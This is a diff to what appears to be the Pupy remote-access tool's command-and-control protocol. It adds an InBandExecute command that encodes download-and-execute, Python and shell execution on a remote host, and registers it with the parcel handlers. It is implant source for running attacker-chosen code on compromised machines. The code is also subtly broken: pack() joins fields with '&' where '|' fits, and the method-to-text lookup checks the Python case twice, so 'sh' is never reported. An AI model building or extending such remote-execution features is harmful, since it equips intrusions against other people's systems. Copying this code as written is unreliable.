@@ -13,6 +13,7 @@ __all__ = (
     'ConnectablePort', 'Error',
 
     'SystemInfoEx', 'ConnectEx', 'RegisterHostnameId',
+    'DataTransferControl', 'DataTransferPayload', 'InBandExecute',
 
     'ParcelInvalidCrc',
     'ParcelInvalidPayload', 'ParcelInvalidCommand',
@@ -1576,6 +1577,56 @@ class DataTransferPayload(Command):
         return DataTransferPayload(transfer_id, data[2:consumed]), consumed
 
 
+class InBandExecute(object):
+    __slots__ = ('method', 'transfer_id', 'output')
+
+    METHOD_STORE_EXECUTE = 0
+    METHOD_PYTHON_EXECUTE = 1
+    METHOD_SH_EXECUTE = 2
+    METHOD_NO_OUTPUT = 0x80
+
+    def __init__(self, method, transfer_id, output=False):
+        if transfer_id is None or transfer_id < 0 or transfer_id > 0xF:
+            raise ValueError('transfer_id should be less than 0xF')
+
+        if method < InBandExecute.METHOD_STORE_EXECUTE or \
+                method > InBandExecute.METHOD_SH_EXECUTE:
+            raise ValueError('Invalid method')
+
+        self.output = output
+        self.method = method
+        self.transfer_id = transfer_id
+
+    def pack(self):
+        return chr(
+            (self.method & (0 if self.output else InBandExecute.METHOD_NO_OUTPUT)) << 4 & \
+                (self.transfer_id & 0xF)
+        )
+
+    @staticmethod
+    def unpack(data):
+        control = ord(data[0])
+        method = (control >> 4) & 0x7
+        output = bool(control >> 7)
+        transfer_id = control & 0xF
+        return InBandExecute(method, transfer_id, output), 1
+
+    def _method_to_text(self):
+        if self.method == InBandExecute.METHOD_STORE_EXECUTE:
+            return 'download+exec'
+        elif self.method == InBandExecute.METHOD_PYTHON_EXECUTE:
+            return 'python'
+        elif self.method == InBandExecute.METHOD_PYTHON_EXECUTE:
+            return 'sh'
+        else:
+            return 'INVALID'
+
+    def __repr__(self):
+        return '{{IBE: TID={} METHOD={} OUTPUT={}}}'.format(
+            self.transfer_id, self._method_to_text(), self.output
+        )
+
+
 class Error(Command):
 
     __slots__ = ('error', 'message')
@@ -1663,7 +1714,8 @@ class Parcel(object):
         SetProxy, OnlineStatusRequest, OnlineStatus, ConnectablePort,
         PortQuizPort, PupyState, CustomEvent,
         # V2 Commands
-        SystemInfoEx, ConnectEx, RegisterHostnameId
+        SystemInfoEx, ConnectEx, RegisterHostnameId,
+        DataTransferControl, DataTransferPayload, InBandExecute
     )
 
     def __init__(self, commands):
